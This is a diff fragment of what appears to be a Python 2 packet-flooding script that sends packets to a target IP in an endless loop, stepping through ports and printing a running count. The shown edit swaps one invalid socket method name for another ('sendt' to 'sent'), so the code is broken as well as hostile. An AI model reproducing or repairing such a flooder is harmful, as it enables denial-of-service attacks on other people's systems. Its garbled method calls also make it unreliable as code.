@@ -75,7 +75,7 @@ print "[\033[92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\033[0m] 100% "
 time.sleep(3)
 sent = 0
 while True:
-    sock.sendt(bytes, (ip,port))
+    sock.sent(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[92mSent %s packet to %s throught port:%s\033[0m"%(sent,ip,port)
